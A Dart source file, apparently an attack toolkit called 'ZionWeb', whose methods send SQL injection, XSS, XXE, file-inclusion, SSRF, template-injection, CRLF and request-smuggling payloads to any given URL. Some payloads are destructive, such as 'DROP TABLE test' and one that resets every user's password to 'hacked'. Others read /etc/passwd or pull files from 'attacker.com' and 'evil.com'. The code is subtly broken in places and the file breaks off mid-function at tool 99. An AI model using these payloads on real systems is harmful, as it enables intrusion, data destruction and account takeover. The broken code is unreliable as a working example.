import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'dart:math';
import 'dart:typed_data';
import 'package:crypto/crypto.dart';
import 'package:http/http.dart' as http;
import 'package:web_socket_channel/web_socket_channel.dart';
import 'package:xml/xml.dart';

/// ZionWeb - 100 Web Security Tools
/// فريق ZionWeb - 100 أداة ويب
class ZionWeb {
  final _random = Random.secure();

  Map<String, dynamic> _createTool(String name, String desc, String type, void Function() execute) {
    return {'name': name, 'description': desc, 'type': type, 'status': 'Active', 'execute': execute};
  }

  // ==================== SQL INJECTION (20 tools) ====================

  /// Tool 1: Basic SQL Injection
  Future<bool> sqlInjectionBasic(String url, String parameter) async {
    final payloads = ["' OR '1'='1", "' OR 1=1--", "' UNION SELECT * FROM users--"];
    for (final payload in payloads) {
      try {
        final response = await http.get(Uri.parse('$url?$parameter=${Uri.encodeComponent(payload)}'));
        if (response.body.contains('error') || response.body.contains('Warning') || response.body.contains('ORA-')) return true;
      } catch (_) {}
    }
    return false;
  }

  /// Tool 2: Blind SQL Injection
  Future<bool> sqlInjectionBlind(String url, String parameter) async {
    final truePayload = "$parameter=1 AND 1=1";
    final falsePayload = "$parameter=1 AND 1=2";
    try {
      final r1 = await http.get(Uri.parse('$url?$truePayload'));
      final r2 = await http.get(Uri.parse('$url?$falsePayload'));
      return r1.body.length != r2.body.length;
    } catch (_) {
      return false;
    }
  }

  /// Tool 3: Time-based SQL Injection
  Future<bool> sqlInjectionTimeBased(String url, String parameter) async {
    final payload = "$parameter=1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)";
    final sw = Stopwatch()..start();
    try {
      await http.get(Uri.parse('$url?$payload'));
    } catch (_) {}
    sw.stop();
    return sw.elapsedMilliseconds > 4000;
  }

  /// Tool 4: Boolean-based SQL Injection
  Future<bool> sqlInjectionBooleanBased(String url, String parameter) async {
    return sqlInjectionBlind(url, parameter);
  }

  /// Tool 5: Error-based SQL Injection
  Future<String> sqlInjectionErrorBased(String url, String parameter) async {
    final payloads = ["'", "\"", "' AND 1=CONVERT(int, (SELECT @@version))--", "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version)))--"];
    for (final payload in payloads) {
      try {
        final response = await http.get(Uri.parse('$url?$parameter=${Uri.encodeComponent(payload)}'));
        if (response.statusCode == 500 || response.body.contains('error') || response.body.contains('syntax')) {
          return 'Error-based SQLi found: ${response.body.substring(0, min(200, response.body.length))}';
        }
      } catch (_) {}
    }
    return 'No error-based SQLi detected';
  }

  /// Tool 6: Union-based SQL Injection
  Future<bool> sqlInjectionUnionBased(String url, String parameter, int columns) async {
    final nulls = List.generate(columns, (_) => 'NULL').join(',');
    final payload = "$parameter=' UNION SELECT $nulls--";
    try {
      final response = await http.get(Uri.parse('$url?$payload'));
      return !response.body.contains('error') && response.statusCode == 200;
    } catch (_) {
      return false;
    }
  }

  /// Tool 7: Stacked Queries SQL Injection
  Future<bool> sqlInjectionStacked(String url, String parameter) async {
    final payload = "$parameter=1; DROP TABLE test--";
    try {
      final response = await http.get(Uri.parse('$url?$payload'));
      return response.statusCode == 200;
    } catch (_) {
      return false;
    }
  }

  /// Tool 8: Out-of-band SQL Injection
  Future<bool> sqlInjectionOob(String url, String parameter, String collaborator) async {
    final payload = "$parameter='; EXEC master..xp_dirtree '\\\\$collaborator\\a'--";
    try {
      await http.get(Uri.parse('$url?$payload'));
      return true;
    } catch (_) {
      return false;
    }
  }

  /// Tool 9: Second-order SQL Injection
  Future<bool> sqlInjectionSecondOrder(String url, String parameter) async {
    final payload = "test'; UPDATE users SET password='hacked' WHERE '1'='1";
    try {
      await http.post(Uri.parse(url), body: {parameter: payload});
      final response = await http.get(Uri.parse(url));
      return response.body.contains('hacked');
    } catch (_) {
      return false;
    }
  }

  /// Tool 10: Cookie-based SQL Injection
  Future<bool> sqlInjectionCookie(String url, String cookieValue) async {
    try {
      final request = http.Request('GET', Uri.parse(url));
      request.headers['Cookie'] = 'session=$cookieValue\' OR \'1\'=\'1';
      final response = await request.send();
      return response.statusCode == 200;
    } catch (_) {
      return false;
    }
  }

  /// Tool 11: Header-based SQL Injection
  Future<bool> sqlInjectionHeader(String url, String headerName) async {
    try {
      final response = await http.get(Uri.parse(url), headers: {headerName: 'test\' OR \'1\'=\'1'});
      return response.statusCode == 200 && !response.body.contains('error');
    } catch (_) {
      return false;
    }
  }

  /// Tool 12: JSON-based SQL Injection
  Future<bool> sqlInjectionJson(String url) async {
    try {
      final response = await http.post(
        Uri.parse(url),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({'user': "admin' OR '1'='1"}),
      );
      return response.statusCode == 200;
    } catch (_) {
      return false;
    }
  }

  /// Tool 13: XML-based SQL Injection
  Future<bool> sqlInjectionXml(String url) async {
    final xmlPayload = '<?xml version="1.0"?><user>admin\' OR \'1\'=\'1</user>';
    try {
      final response = await http.post(Uri.parse(url), headers: {'Content-Type': 'application/xml'}, body: xmlPayload);
      return response.statusCode == 200;
    } catch (_) {
      return false;
    }
  }

  /// Tool 14: XPath Injection
  Future<bool> xpathInjection(String url, String parameter) async {
    final payload = "'] | //* | //*[\"";
    try {
      final response = await http.get(Uri.parse('$url?$parameter=${Uri.encodeComponent(payload)}'));
      return response.body.contains('<') && response.body.contains('>');
    } catch (_) {
      return false;
    }
  }

  /// Tool 15: LDAP Injection
  Future<bool> ldapInjection(String url, String parameter) async {
    final payloads = ['*)(uid=*))(&(uid=*', '*)(|(uid=*))'];
    for (final payload in payloads) {
      try {
        final response = await http.get(Uri.parse('$url?$parameter=${Uri.encodeComponent(payload)}'));
        if (response.body.contains('dc=') || response.body.contains('ou=')) return true;
      } catch (_) {}
    }
    return false;
  }

  /// Tool 16: NoSQL Injection
  Future<bool> nosqlInjection(String url, String parameter) async {
    try {
      final response = await http.post(
        Uri.parse(url),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({parameter: {'\$ne': null}}),
      );
      return response.statusCode == 200;
    } catch (_) {
      return false;
    }
  }

  /// Tool 17: MongoDB Injection
  Future<bool> mongodbInjection(String url, String parameter) async {
    return nosqlInjection(url, parameter);
  }

  /// Tool 18: CouchDB Injection
  Future<bool> couchdbInjection(String url) async {
    try {
      final response = await http.get(Uri.parse('$url/_all_docs'));
      return response.statusCode == 200 && response.body.contains('total_rows');
    } catch (_) {
      return false;
    }
  }

  /// Tool 19: Redis Injection
  Future<bool> redisInjection(String url) async {
    try {
      final response = await http.get(Uri.parse('$url?query=KEYS *'));
      return response.body.contains('string') || response.body.contains('list');
    } catch (_) {
      return false;
    }
  }

  /// Tool 20: Elasticsearch Injection
  Future<bool> elasticsearchInjection(String url) async {
    try {
      final response = await http.post(
        Uri.parse('$url/_search'),
        headers: {'Content-Type': 'application/json'},
        body: '{"query": {"match_all": {}}}';
      );
      return response.statusCode == 200 && response.body.contains('hits');
    } catch (_) {
      return false;
    }
  }

  // ==================== XSS ATTACKS (8 tools) ====================

  /// Tool 21: Reflected XSS
  Future<bool> xssReflected(String url, String parameter) async {
    final payload = '<script>alert(1)</script>';
    try {
      final response = await http.get(Uri.parse('$url?$parameter=${Uri.encodeComponent(payload)}'));
      return response.body.contains(payload);
    } catch (_) {
      return false;
    }
  }

  /// Tool 22: Stored XSS
  Future<bool> xssStored(String url, String field) async {
    final payload = '<img src=x onerror=alert(1)>';
    try {
      await http.post(Uri.parse(url), body: {field: payload});
      final response = await http.get(Uri.parse(url));
      return response.body.contains('onerror=alert(1)');
    } catch (_) {
      return false;
    }
  }

  /// Tool 23: DOM-based XSS
  Future<bool> xssDom(String url) async {
    try {
      final response = await http.get(Uri.parse('$url#<img src=x onerror=alert(1)>'));
      return response.body.contains('document.write') || response.body.contains('innerHTML');
    } catch (_) {
      return false;
    }
  }

  /// Tool 24: Blind XSS
  Future<bool> xssBlind(String url, String field, String callback) async {
    final payload = '<script src="$callback"></script>';
    try {
      await http.post(Uri.parse(url), body: {field: payload});
      return true;
    } catch (_) {
      return false;
    }
  }

  /// Tool 25: mXSS (Mutation XSS)
  Future<bool> xssMutation(String url, String parameter) async {
    final payload = '<table><background-image url="javascript:alert(1)">';
    try {
      final response = await http.get(Uri.parse('$url?$parameter=${Uri.encodeComponent(payload)}'));
      return response.body.contains('javascript:alert');
    } catch (_) {
      return false;
    }
  }

  /// Tool 26: Universal XSS
  Future<bool> xssUniversal(String url) async {
    try {
      final response = await http.get(Uri.parse(url));
      return response.headers['content-security-policy'] == null;
    } catch (_) {
      return false;
    }
  }

  /// Tool 27: Self-XSS
  Future<bool> xssSelf(String url) async {
    try {
      final response = await http.get(Uri.parse(url));
      return response.body.contains('eval(') || response.body.contains('Function(');
    } catch (_) {
      return false;
    }
  }

  /// Tool 28: Mutation-based XSS
  Future<bool> xssMutationBased(String url, String parameter) async {
    final payload = '<svg onload=alert(1)>';
    try {
      final response = await http.get(Uri.parse('$url?$parameter=${Uri.encodeComponent(payload)}'));
      return response.body.contains('<svg onload=alert(1)>');
    } catch (_) {
      return false;
    }
  }

  // ==================== XXE ATTACKS (12 tools) ====================

  /// Tool 29: Basic XXE
  Future<bool> xxeBasic(String url) async {
    final payload = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>';
    try {
      final response = await http.post(Uri.parse(url), headers: {'Content-Type': 'application/xml'}, body: payload);
      return response.body.contains('root:') || response.body.contains('bin/bash');
    } catch (_) {
      return false;
    }
  }

  /// Tool 30: Blind XXE
  Future<bool> xxeBlind(String url, String callback) async {
    final payload = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "$callback">%xxe;]><foo></foo>';
    try {
      await http.post(Uri.parse(url), headers: {'Content-Type': 'application/xml'}, body: payload);
      return true;
    } catch (_) {
      return false;
    }
  }

  /// Tool 31: XXE Parameter Entities
  Future<bool> xxeParameterEntities(String url) async {
    final payload = '''<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
%dtd;
]>
<data>&send;</data>''';
    try {
      await http.post(Uri.parse(url), headers: {'Content-Type': 'application/xml'}, body: payload);
      return true;
    } catch (_) {
      return false;
    }
  }

  /// Tool 32: XXE Doctype
  Future<bool> xxeDoctype(String url) async {
    return xxeBasic(url);
  }

  /// Tool 33: XXE Encoding
  Future<bool> xxeEncoding(String url) async {
    final payload = '<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>';
    try {
      final response = await http.post(Uri.parse(url), headers: {'Content-Type': 'application/xml'}, body: payload);
      return response.statusCode == 200;
    } catch (_) {
      return false;
    }
  }

  /// Tool 34: XXE Base64
  Future<bool> xxeBase64(String url) async {
    final payload = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///etc/passwd">]><foo>&xxe;</foo>';
    try {
      final response = await http.post(Uri.parse(url), headers: {'Content-Type': 'application/xml'}, body: payload);
      return response.body.contains('cm9vdDo');
    } catch (_) {
      return false;
    }
  }

  /// Tool 35: XXE CDATA
  Future<bool> xxeCdata(String url) async {
    final payload = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo><![CDATA[&xxe;]]></foo>';
    try {
      final response = await http.post(Uri.parse(url), headers: {'Content-Type': 'application/xml'}, body: payload);
      return response.statusCode == 200;
    } catch (_) {
      return false;
    }
  }

  /// Tool 36: XXE SOAP
  Future<bool> xxeSoap(String url) async {
    final payload = '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body><foo>&xxe;</foo></soap:Body>
</soap:Envelope>''';
    try {
      final response = await http.post(Uri.parse(url), headers: {'Content-Type': 'text/xml'}, body: payload);
      return response.statusCode == 200;
    } catch (_) {
      return false;
    }
  }

  /// Tool 37: XXE SVG
  Future<bool> xxeSvg(String url) async {
    final payload = '''<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>''';
    try {
      final response = await http.post(Uri.parse(url), headers: {'Content-Type': 'image/svg+xml'}, body: payload);
      return response.statusCode == 200;
    } catch (_) {
      return false;
    }
  }

  /// Tool 38: XXE DOCX
  Future<bool> xxeDocx(String url) async {
    final payload = '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
<w:body><w:p><w:r><w:t>&xxe;</w:t></w:r></w:p></w:body>
</w:document>''';
    try {
      final response = await http.post(Uri.parse(url), headers: {'Content-Type': 'application/vnd.openxmlformats-officedocument.wordprocessingml.document'}, body: payload);
      return response.statusCode == 200;
    } catch (_) {
      return false;
    }
  }

  /// Tool 39: XXE XLSX
  Future<bool> xxeXlsx(String url) async {
    try {
      final response = await http.post(Uri.parse(url), headers: {'Content-Type': 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'});
      return response.statusCode == 200;
    } catch (_) {
      return false;
    }
  }

  /// Tool 40: XXE PPTX
  Future<bool> xxePptx(String url) async {
    try {
      final response = await http.post(Uri.parse(url), headers: {'Content-Type': 'application/vnd.openxmlformats-officedocument.presentationml.presentation'});
      return response.statusCode == 200;
    } catch (_) {
      return false;
    }
  }

  // ==================== FILE INCLUSION (6 tools) ====================

  /// Tool 41: Local File Inclusion (LFI)
  Future<bool> lfi(String url, String parameter) async {
    final payloads = ['../../../etc/passwd', '....//....//etc/passwd', '..%2f..%2f..%2fetc/passwd'];
    for (final payload in payloads) {
      try {
        final response = await http.get(Uri.parse('$url?$parameter=$payload'));
        if (response.body.contains('root:') || response.body.contains('bin/bash')) return true;
      } catch (_) {}
    }
    return false;
  }

  /// Tool 42: Remote File Inclusion (RFI)
  Future<bool> rfi(String url, String parameter, String remoteFile) async {
    try {
      final response = await http.get(Uri.parse('$url?$parameter=$remoteFile'));
      return response.statusCode == 200;
    } catch (_) {
      return false;
    }
  }

  /// Tool 43: Path Traversal
  Future<bool> pathTraversal(String url, String parameter) async {
    return lfi(url, parameter);
  }

  /// Tool 44: Directory Listing
  Future<bool> directoryListing(String url) async {
    try {
      final response = await http.get(Uri.parse(url));
      return response.body.contains('Index of') || response.body.contains('Directory Listing');
    } catch (_) {
      return false;
    }
  }

  /// Tool 45: File Inclusion
  Future<bool> fileInclusion(String url, String parameter) async {
    return lfi(url, parameter) || rfi(url, parameter, 'http://evil.com/shell.txt');
  }

  /// Tool 46: File Upload Exploit
  Future<bool> fileUploadExploit(String url, String fieldName, String filename, List<int> content) async {
    try {
      final request = http.MultipartRequest('POST', Uri.parse(url));
      request.files.add(http.MultipartFile.fromBytes(fieldName, content, filename: filename));
      final response = await request.send();
      return response.statusCode == 200;
    } catch (_) {
      return false;
    }
  }

  // ==================== CSRF & SSRF (12 tools) ====================

  /// Tool 47: CSRF Detection
  Future<bool> csrfDetect(String url) async {
    try {
      final response = await http.get(Uri.parse(url));
      return !response.body.contains('csrf') && !response.body.contains('anti-forgery');
    } catch (_) {
      return false;
    }
  }

  /// Tool 48: SSRF Basic
  Future<bool> ssrfBasic(String url, String parameter) async {
    final payloads = ['http://127.0.0.1', 'http://localhost', 'http://0.0.0.0', 'file:///etc/passwd'];
    for (final payload in payloads) {
      try {
        final response = await http.get(Uri.parse('$url?$parameter=${Uri.encodeComponent(payload)}'));
        if (response.body.contains('root:') || response.statusCode == 200) return true;
      } catch (_) {}
    }
    return false;
  }

  /// Tool 49: SSRF Blind
  Future<bool> ssrfBlind(String url, String parameter, String callback) async {
    try {
      await http.get(Uri.parse('$url?$parameter=${Uri.encodeComponent(callback)}'));
      return true;
    } catch (_) {
      return false;
    }
  }

  /// Tool 50: SSRF via SMTP
  Future<bool> ssrfSmtp(String url, String parameter) async {
    return ssrfBasic(url, parameter);
  }

  /// Tool 51: SSRF via IMAP
  Future<bool> ssrfImap(String url, String parameter) async {
    return ssrfBasic(url, parameter);
  }

  /// Tool 52: SSRF via POP3
  Future<bool> ssrfPop3(String url, String parameter) async {
    return ssrfBasic(url, parameter);
  }

  /// Tool 53: SSRF via Gopher
  Future<bool> ssrfGopher(String url, String parameter) async {
    try {
      final response = await http.get(Uri.parse('$url?$parameter=gopher://127.0.0.1:9000/_test'));
      return response.statusCode == 200;
    } catch (_) {
      return false;
    }
  }

  /// Tool 54: SSRF via Dict
  Future<bool> ssrfDict(String url, String parameter) async {
    try {
      final response = await http.get(Uri.parse('$url?$parameter=dict://127.0.0.1:2628/show:db'));
      return response.statusCode == 200;
    } catch (_) {
      return false;
    }
  }

  /// Tool 55: SSRF via File
  Future<bool> ssrfFile(String url, String parameter) async {
    try {
      final response = await http.get(Uri.parse('$url?$parameter=file:///etc/passwd'));
      return response.body.contains('root:');
    } catch (_) {
      return false;
    }
  }

  /// Tool 56: SSRF via HTTP
  Future<bool> ssrfHttp(String url, String parameter) async {
    return ssrfBasic(url, parameter);
  }

  /// Tool 57: SSRF via HTTPS
  Future<bool> ssrfHttps(String url, String parameter) async {
    try {
      final response = await http.get(Uri.parse('$url?$parameter=https://127.0.0.1'));
      return response.statusCode == 200;
    } catch (_) {
      return false;
    }
  }

  /// Tool 58: SSRF via FTP
  Future<bool> ssrfFtp(String url, String parameter) async {
    try {
      final response = await http.get(Uri.parse('$url?$parameter=ftp://anonymous@127.0.0.1/'));
      return response.statusCode == 200;
    } catch (_) {
      return false;
    }
  }

  // ==================== REGEX & TEMPLATE INJECTION (18 tools) ====================

  /// Tool 59: ReDoS Detection
  Future<bool> redosDetect(String url, String parameter) async {
    final maliciousInput = 'a' * 10000 + '!';
    final sw = Stopwatch()..start();
    try {
      await http.get(Uri.parse('$url?$parameter=${Uri.encodeComponent(maliciousInput)}'));
    } catch (_) {}
    sw.stop();
    return sw.elapsedMilliseconds > 5000;
  }

  /// Tool 60: Regex Injection
  Future<bool> regexInjection(String url, String parameter) async {
    final payload = '.*';
    try {
      final response = await http.get(Uri.parse('$url?$parameter=${Uri.encodeComponent(payload)}'));
      return response.body.length > 1000;
    } catch (_) {
      return false;
    }
  }

  /// Tool 61: Template Injection Detection
  Future<bool> templateInjectionDetect(String url, String parameter) async {
    final payloads = ['{{7*7}}', '\${7*7}', '<%= 7*7 %>', '\#{7*7}'];
    for (final payload in payloads) {
      try {
        final response = await http.get(Uri.parse('$url?$parameter=${Uri.encodeComponent(payload)}'));
        if (response.body.contains('49')) return true;
      } catch (_) {}
    }
    return false;
  }

  /// Tool 62: SSTI (Server-Side Template Injection)
  Future<bool> ssti(String url, String parameter) async {
    return templateInjectionDetect(url, parameter);
  }

  /// Tool 63: JSTL Injection
  Future<bool> jstlInjection(String url, String parameter) async {
    final payload = '\${applicationScope}';
    try {
      final response = await http.get(Uri.parse('$url?$parameter=${Uri.encodeComponent(payload)}'));
      return response.body.contains('java');
    } catch (_) {
      return false;
    }
  }

  /// Tool 64: Velocity Injection
  Future<bool> velocityInjection(String url, String parameter) async {
    final payload = '#set(\$x = 7 * 7)\$x';
    try {
      final response = await http.get(Uri.parse('$url?$parameter=${Uri.encodeComponent(payload)}'));
      return response.body.contains('49');
    } catch (_) {
      return false;
    }
  }

  /// Tool 65: FreeMarker Injection
  Future<bool> freemarkerInjection(String url, String parameter) async {
    final payload = '\${7*7}';
    try {
      final response = await http.get(Uri.parse('$url?$parameter=${Uri.encodeComponent(payload)}'));
      return response.body.contains('49');
    } catch (_) {
      return false;
    }
  }

  /// Tool 66: Thymeleaf Injection
  Future<bool> thymeleafInjection(String url, String parameter) async {
    final payload = 'th:text="\${T(java.lang.Runtime).getRuntime().exec(\'id\')}"';
    try {
      final response = await http.get(Uri.parse('$url?$parameter=${Uri.encodeComponent(payload)}'));
      return response.statusCode == 200;
    } catch (_) {
      return false;
    }
  }

  /// Tool 67: Jinja2 Injection
  Future<bool> jinja2Injection(String url, String parameter) async {
    final payload = '{{config}}';
    try {
      final response = await http.get(Uri.parse('$url?$parameter=${Uri.encodeComponent(payload)}'));
      return response.body.contains('Config') || response.body.contains('<Config');
    } catch (_) {
      return false;
    }
  }

  /// Tool 68: Twig Injection
  Future<bool> twigInjection(String url, String parameter) async {
    final payload = '{{7*7}}';
    try {
      final response = await http.get(Uri.parse('$url?$parameter=${Uri.encodeComponent(payload)}'));
      return response.body.contains('49');
    } catch (_) {
      return false;
    }
  }

  /// Tool 69: Smarty Injection
  Future<bool> smartyInjection(String url, String parameter) async {
    final payload = '{math equation="7*7"}';
    try {
      final response = await http.get(Uri.parse('$url?$parameter=${Uri.encodeComponent(payload)}'));
      return response.body.contains('49');
    } catch (_) {
      return false;
    }
  }

  /// Tool 70: Blade Injection
  Future<bool> bladeInjection(String url, String parameter) async {
    final payload = '{{7*7}}';
    try {
      final response = await http.get(Uri.parse('$url?$parameter=${Uri.encodeComponent(payload)}'));
      return response.body.contains('49');
    } catch (_) {
      return false;
    }
  }

  /// Tool 71: ERB Injection
  Future<bool> erbInjection(String url, String parameter) async {
    final payload = '<%= 7*7 %>';
    try {
      final response = await http.get(Uri.parse('$url?$parameter=${Uri.encodeComponent(payload)}'));
      return response.body.contains('49');
    } catch (_) {
      return false;
    }
  }

  /// Tool 72: HAML Injection
  Future<bool> hamlInjection(String url, String parameter) async {
    final payload = '= 7*7';
    try {
      final response = await http.get(Uri.parse('$url?$parameter=${Uri.encodeComponent(payload)}'));
      return response.body.contains('49');
    } catch (_) {
      return false;
    }
  }

  /// Tool 73: Slim Injection
  Future<bool> slimInjection(String url, String parameter) async {
    final payload = '= 7*7';
    try {
      final response = await http.get(Uri.parse('$url?$parameter=${Uri.encodeComponent(payload)}'));
      return response.body.contains('49');
    } catch (_) {
      return false;
    }
  }

  /// Tool 74: EL Injection (Expression Language)
  Future<bool> elInjection(String url, String parameter) async {
    final payload = '\${7*7}';
    try {
      final response = await http.get(Uri.parse('$url?$parameter=${Uri.encodeComponent(payload)}'));
      return response.body.contains('49');
    } catch (_) {
      return false;
    }
  }

  /// Tool 75: OGNL Injection
  Future<bool> ognlInjection(String url, String parameter) async {
    final payload = '\${#context["com.opensymphony.xwork2.dispatcher.HttpServletResponse"].addHeader("X-Test",49*49)}';
    try {
      final response = await http.get(Uri.parse('$url?$parameter=${Uri.encodeComponent(payload)}'));
      return response.headers.containsKey('x-test');
    } catch (_) {
      return false;
    }
  }

  /// Tool 76: MVEL Injection
  Future<bool> mvelInjection(String url, String parameter) async {
    final payload = '@{7*7}';
    try {
      final response = await http.get(Uri.parse('$url?$parameter=${Uri.encodeComponent(payload)}'));
      return response.body.contains('49');
    } catch (_) {
      return false;
    }
  }

  /// Tool 77: SpEL Injection (Spring Expression Language)
  Future<bool> spelInjection(String url, String parameter) async {
    final payload = '\${T(java.lang.Math).random()}';
    try {
      final response = await http.get(Uri.parse('$url?$parameter=${Uri.encodeComponent(payload)}'));
      return response.body.contains('0.');
    } catch (_) {
      return false;
    }
  }

  // ==================== MISCONFIGURATION (23 tools) ====================

  /// Tool 78: JSONP Injection
  Future<bool> jsonpInjection(String url) async {
    try {
      final response = await http.get(Uri.parse('$url?callback=alert'));
      return response.body.startsWith('alert(');
    } catch (_) {
      return false;
    }
  }

  /// Tool 79: CORS Misconfiguration
  Future<Map<String, dynamic>> corsMisconfig(String url) async {
    final results = <String, dynamic>{};
    final origins = ['https://evil.com', 'null', 'https://$url.evil.com'];
    for (final origin in origins) {
      try {
        final response = await http.get(Uri.parse(url), headers: {'Origin': origin});
        final acao = response.headers['access-control-allow-origin'];
        results[origin] = acao == '*' || acao == origin;
      } catch (_) {}
    }
    return results;
  }

  /// Tool 80: HSTS Missing
  Future<bool> hstsMissing(String url) async {
    try {
      final response = await http.get(Uri.parse(url));
      return !response.headers.containsKey('strict-transport-security');
    } catch (_) {
      return false;
    }
  }

  /// Tool 81: CSP Bypass
  Future<Map<String, dynamic>> cspBypass(String url) async {
    try {
      final response = await http.get(Uri.parse(url));
      final csp = response.headers['content-security-policy'] ?? '';
      return {
        'unsafe-inline': csp.contains("'unsafe-inline'"),
        'unsafe-eval': csp.contains("'unsafe-eval'"),
        'wildcard': csp.contains('*'),
        'data-scheme': csp.contains('data:'),
        'missing': csp.isEmpty,
      };
    } catch (_) {
      return {'missing': true};
    }
  }

  /// Tool 82: X-Frame-Options Bypass
  Future<bool> xfoBypass(String url) async {
    try {
      final response = await http.get(Uri.parse(url));
      return !response.headers.containsKey('x-frame-options');
    } catch (_) {
      return false;
    }
  }

  /// Tool 83: XSS Protection Bypass
  Future<bool> xssProtectionBypass(String url) async {
    try {
      final response = await http.get(Uri.parse(url));
      final xss = response.headers['x-xss-protection'];
      return xss == null || xss == '0';
    } catch (_) {
      return false;
    }
  }

  /// Tool 84: Content-Type Options Missing
  Future<bool> contentTypeOptionsMissing(String url) async {
    try {
      final response = await http.get(Uri.parse(url));
      return !response.headers.containsKey('x-content-type-options');
    } catch (_) {
      return false;
    }
  }

  /// Tool 85: Referrer Policy Missing
  Future<bool> referrerPolicyMissing(String url) async {
    try {
      final response = await http.get(Uri.parse(url));
      return !response.headers.containsKey('referrer-policy');
    } catch (_) {
      return false;
    }
  }

  /// Tool 86: Permissions Policy Missing
  Future<bool> permissionsPolicyMissing(String url) async {
    try {
      final response = await http.get(Uri.parse(url));
      return !response.headers.containsKey('permissions-policy');
    } catch (_) {
      return false;
    }
  }

  /// Tool 87: Feature Policy Missing
  Future<bool> featurePolicyMissing(String url) async {
    try {
      final response = await http.get(Uri.parse(url));
      return !response.headers.containsKey('feature-policy');
    } catch (_) {
      return false;
    }
  }

  /// Tool 88: Reporting API Check
  Future<bool> reportingApiCheck(String url) async {
    try {
      final response = await http.get(Uri.parse(url));
      return response.headers.containsKey('report-to');
    } catch (_) {
      return false;
    }
  }

  /// Tool 89: Network Error Logging
  Future<bool> networkErrorLogging(String url) async {
    try {
      final response = await http.get(Uri.parse(url));
      return response.headers.containsKey('nel');
    } catch (_) {
      return false;
    }
  }

  /// Tool 90: Certificate Transparency
  Future<bool> certificateTransparency(String url) async {
    try {
      final response = await http.get(Uri.parse(url));
      return response.headers.containsKey('expect-ct');
    } catch (_) {
      return false;
    }
  }

  /// Tool 91: Public Key Pinning
  Future<bool> publicKeyPinning(String url) async {
    try {
      final response = await http.get(Uri.parse(url));
      return response.headers.containsKey('public-key-pins');
    } catch (_) {
      return false;
    }
  }

  /// Tool 92: Expect-CT Check
  Future<bool> expectCtCheck(String url) async {
    try {
      final response = await http.get(Uri.parse(url));
      return response.headers.containsKey('expect-ct');
    } catch (_) {
      return false;
    }
  }

  /// Tool 93: Security Headers Audit
  Future<Map<String, dynamic>> securityHeadersAudit(String url) async {
    try {
      final response = await http.get(Uri.parse(url));
      final headers = response.headers;
      return {
        'x-frame-options': headers['x-frame-options'] ?? 'MISSING',
        'x-content-type-options': headers['x-content-type-options'] ?? 'MISSING',
        'x-xss-protection': headers['x-xss-protection'] ?? 'MISSING',
        'strict-transport-security': headers['strict-transport-security'] ?? 'MISSING',
        'content-security-policy': headers['content-security-policy'] ?? 'MISSING',
        'referrer-policy': headers['referrer-policy'] ?? 'MISSING',
        'permissions-policy': headers['permissions-policy'] ?? 'MISSING',
      };
    } catch (e) {
      return {'error': e.toString()};
    }
  }

  /// Tool 94: Open Redirect Detection
  Future<bool> openRedirectDetect(String url, String parameter) async {
    final payloads = ['https://evil.com', '//evil.com', '/\\evil.com'];
    for (final payload in payloads) {
      try {
        final request = http.Request('GET', Uri.parse('$url?$parameter=$payload'));
        request.followRedirects = false;
        final response = await http.Client().send(request);
        if (response.isRedirect && response.headers['location']?.contains('evil.com') == true) return true;
      } catch (_) {}
    }
    return false;
  }

  /// Tool 95: CRLF Injection
  Future<bool> crlfInjection(String url, String parameter) async {
    final payload = '%0d%0aSet-Cookie:%20session=hacked';
    try {
      final response = await http.get(Uri.parse('$url?$parameter=$payload'));
      return response.headers.containsKey('set-cookie') && response.headers['set-cookie']!.contains('hacked');
    } catch (_) {
      return false;
    }
  }

  /// Tool 96: HTTP Request Smuggling
  Future<bool> httpRequestSmuggling(String url) async {
    final payload = 'POST / HTTP/1.1\r\nHost: ${Uri.parse(url).host}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG';
    try {
      final socket = await Socket.connect(Uri.parse(url).host, 80, timeout: const Duration(seconds: 5));
      socket.write(payload);
      final response = await socket.first.timeout(const Duration(seconds: 5));
      socket.close();
      return utf8.decode(response).contains('HTTP/1.1');
    } catch (_) {
      return false;
    }
  }

  /// Tool 97: Web Cache Poisoning
  Future<bool> webCachePoisoning(String url) async {
    try {
      final r1 = await http.get(Uri.parse(url), headers: {'X-Forwarded-Host': 'evil.com'});
      final r2 = await http.get(Uri.parse(url));
      return r1.body != r2.body;
    } catch (_) {
      return false;
    }
  }

  /// Tool 98: HTTP Method Override
  Future<bool> httpMethodOverride(String url) async {
    final methods = ['PUT', 'DELETE', 'PATCH', 'TRACE', 'CONNECT'];
    for (final method in methods) {
      try {
        final request = http.Request(method, Uri.parse(url));
        final response = await request.send();
        if (response.statusCode != 405 && response.statusCode != 501) return true;
      } catch (_) {}
    }
    return false;
  }

  /// Tool 99: API Endpoint Enumeration
  Future<List<String>> apiEndpointEnumeration(String baseUrl) async {
    final endpoints = <String>[];
    final commonPaths = ['/api/v1', '/api/v2', '/graphql', '/swagger.json', '/api-docs', '/rest', '/ws'];
    for (final path in commonPaths) {
      try {
